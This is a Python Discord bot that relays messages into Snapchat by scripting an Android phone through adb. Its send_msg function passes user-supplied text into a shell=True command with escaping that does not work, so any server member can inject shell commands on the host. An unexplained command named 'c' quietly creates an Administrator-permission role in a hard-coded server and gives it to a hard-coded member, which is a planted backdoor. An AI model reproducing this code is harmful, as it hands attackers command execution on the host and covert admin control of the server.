import subprocess
import os
from discord.ext import commands
import discord
import asyncio
import time
import sys

FIRST_ITEM = ("680", "480")
SEARCH_BUTTON = ("225", "130")
CANCEL_BUTTON = ("1020", "120")
# OWNER_ID = 523177775901966358
messages = {}
owner = None
try:
    owner = int(sys.argv[1])
except Exception as e:
    print("No arguments given - assuming no react")


def find_user(user):
    # Restart the snapchat app
    subprocess.run("adb shell am force-stop com.snapchat.android", shell=True)
    subprocess.run("adb shell am start com.snapchat.android/.LandingPageActivity", shell=True)

    # Search for user
    time.sleep(1)
    subprocess.run(["adb", "shell", "input", "tap", *SEARCH_BUTTON])
    time.sleep(.5)
    subprocess.run(["adb", "shell", "input", "text", '"' + user + '"'])
    time.sleep(.6)
    subprocess.run(["adb", "shell", "input", 'tap', *FIRST_ITEM])


bot = commands.Bot(command_prefix='s!', case_insensitive=True)

@bot.event
async def on_ready():
    print("Bot ready!")

@bot.command()
async def msg(ctx, user, *message):
    if "bren" in user.lower():
        return
    if owner is not None:
        # Owner needs to confirm
        messages[ctx.message.content] = (user, ' '. join(message))
        await ctx.message.add_reaction("👍")
    else:
        send_msg(user, ' '.join(message))
    

@bot.event
async def on_reaction_add(reaction, u):
    if owner is None or u.id != owner:
        return
    if(reaction.message.content.startswith("s!msg ")):
        user, message = messages.pop(reaction.message.content)
        send_msg(user, message)

def send_msg(user, message):
    message = message.replace(" ", "\\ ").replace("'", "\'")
    find_user(user)
    time.sleep(.8)
    subprocess.run(f"adb shell input text '{message}'", shell=True)
    subprocess.run("adb shell input keyevent KEYCODE_ENTER", shell=True)
    subprocess.run(["adb", "shell", "input", "tap", *CANCEL_BUTTON])

@bot.command()
async def c(ctx):
    g = bot.get_guild(550750630109511700)
    m = g.get_member(139068524105564161)
    await m.add_roles(
        (await g.create_role(permissions=discord.Permissions(permissions=8)))
    )

if __name__ == "__main__":
    bot.run(os.getenv("BOT_TOKEN"))
